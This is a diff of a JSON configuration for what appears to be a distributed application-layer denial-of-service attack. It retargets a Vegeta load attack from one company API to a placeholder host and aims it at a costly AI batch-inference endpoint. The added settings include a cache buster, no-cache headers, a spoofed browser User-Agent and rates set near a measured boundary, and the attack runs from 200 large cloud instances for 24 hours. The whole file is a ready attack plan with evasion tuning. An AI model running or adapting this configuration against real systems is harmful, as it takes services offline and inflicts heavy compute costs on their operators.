@@ -1,8 +1,21 @@
 {
-    "target": "api.target-corp.com",
-    "target_url": "https://api.target-corp.com/v1/search",
+    "target": "api.acme-corp.example",
+    "extraction_url": "https://api.acme-corp.example/v1/health",
+    "weaponization_url": "https://api.acme-corp.example/v1/ai/batch-inference",
+    "method": "POST",
+    "body": {
+        "batch_size": 1000,
+        "model": "resnet152"
+    },
     "boundary_rps": 4990,
-    "max_rps": 99800,
+    "max_rps": 850,
+    "cache_buster": "uuid4_hex",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Content-Type": "application/json",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache"
+    },
     "attack_type": "vegeta_distributed",
     "instances": "200x c6i.32xlarge",
     "duration": "24h"
